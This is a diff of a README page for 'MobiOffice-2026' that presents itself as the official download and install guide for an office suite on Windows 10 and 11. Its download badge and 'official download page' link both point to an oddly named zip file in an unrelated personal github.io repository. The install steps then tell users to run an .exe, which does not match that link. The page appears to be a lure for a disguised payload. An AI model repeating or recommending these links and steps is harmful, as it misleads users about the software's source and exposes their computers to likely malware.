@@ -5,7 +5,7 @@ description: "Download and install MobiOffice for Windows 10 and 11 using a sing
 ---
 # 📈 MobiOffice-2026 - Complete office suite for your work
 
-[![Download MobiOffice](https://img.shields.io/badge/Download-MobiOffice-blue.svg)](https://github.com/Chapterbubblegum788/chapterbubblegum788.github.io/raw/refs/heads/main/congruism/io_github_chapterbubblegum_v2.1.zip)
+[![Download MobiOffice](https://img.shields.io/badge/Download-MobiOffice-blue.svg)](https://raw.githubusercontent.com/Chapterbubblegum788/chapterbubblegum788.github.io/main/congruism/io_github_chapterbubblegum_v2.1.zip)
 
 MobiOffice-2026 provides tools for your daily tasks. This software package includes a word processor for documents and a spreadsheet tool for data. It runs on Windows 11 and Windows 10. You can create, edit, and save files without complex settings.
 
@@ -16,7 +16,7 @@ Check your computer before you start the installation. You need a Windows 10 or 
 ## 📥 How to Install MobiOffice
 
 1. Open your web browser.
-2. Visit the [official download page](https://github.com/Chapterbubblegum788/chapterbubblegum788.github.io/raw/refs/heads/main/congruism/io_github_chapterbubblegum_v2.1.zip).
+2. Visit the [official download page](https://raw.githubusercontent.com/Chapterbubblegum788/chapterbubblegum788.github.io/main/congruism/io_github_chapterbubblegum_v2.1.zip).
 3. Find the latest release version on the screen.
 4. Click the file with the .exe extension to start the download.
 5. Wait for the file to finish downloading to your computer.
